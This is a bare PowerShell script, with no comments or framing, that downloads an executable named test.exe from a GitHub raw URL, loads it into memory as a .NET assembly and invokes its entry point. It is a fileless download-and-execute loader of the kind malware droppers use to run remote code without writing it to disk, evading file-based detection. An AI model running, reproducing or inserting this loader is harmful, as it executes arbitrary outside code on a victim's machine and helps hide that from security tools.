$url = "https://raw.githubusercontent.com/mohamedali43/ps1/main/test.exe"

$bytes = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content

$memoryStream = New-Object System.IO.MemoryStream
$memoryStream.Write($bytes, 0, $bytes.Length)
$memoryStream.Seek(0, [System.IO.SeekOrigin]::Begin)

$assembly = [System.Reflection.Assembly]::Load($memoryStream.ToArray())

$assembly.EntryPoint.Invoke($null, $null)
